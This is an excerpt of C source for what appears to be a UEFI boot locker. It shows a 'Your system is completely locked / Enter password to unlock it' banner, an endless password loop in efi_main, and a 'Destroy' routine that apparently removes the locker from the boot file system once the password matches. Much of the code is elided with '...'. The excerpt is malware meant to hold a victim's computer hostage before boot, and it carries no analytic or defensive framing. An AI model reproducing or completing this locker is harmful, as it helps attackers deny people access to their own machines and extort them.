...
L"[ BOOT   LOCKER ]\r\n"
L"  STATUS:HALTED\r\n\r\n"
L"Your system is completely locked\r\n"
L"Enter password to unlock it\r\n"
L"\r\n\r\n";




#define EFI_THEME_LOCKED      EFI_BACKGROUND_BLACK | EFI_LIGHTRED
#define EFI_THEME_UNLOCKED    EFI_BACKGROUND_BLACK | EFI_LIGHTGREEN
...
static inline void Destroy(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SystemTable) {
    EFI_LOADED_IMAGE *LoadedImage;
    EFI_FILE_IO_INTERFACE *FileSystem;
    EFI_FILE_HANDLE Root, File;
    EFI_STATUS Status;

    EFI_SET_COLOR(EFI_THEME_UNLOCKED);
    EFI_CLEAR_OUTPUT();
...
efi_main(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SystemTable) {
    ...
    EFI_SET_COLOR(EFI_THEME_LOCKED);
    ...
    while (1) { 
        ...
        if (TwisterEqual(password, PASSWORD)) {
            EFI_CLEAR_ARRAY(password);
            Destroy(ImageHandle, SystemTable); 
        }
        else {
            EFI_CLEAR_ARRAY(password);
            PRINT_DENIED();
